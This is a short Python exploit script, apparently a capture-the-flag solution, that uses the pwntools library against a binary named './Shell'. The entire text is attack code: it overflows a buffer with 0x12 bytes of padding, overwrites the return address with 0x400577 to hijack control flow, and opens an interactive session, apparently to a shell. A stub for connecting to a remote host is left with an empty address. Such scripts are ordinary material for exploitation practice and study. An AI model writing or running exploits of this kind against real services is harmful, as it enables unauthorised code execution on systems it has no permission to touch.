#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
# context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./Shell')
else:
    p = remote('', )
elf = ELF('./Shell', checksec=False)

pd = 'a' * 0x12
pd += p64(0x400577)
p.send(pd)
p.interactive()
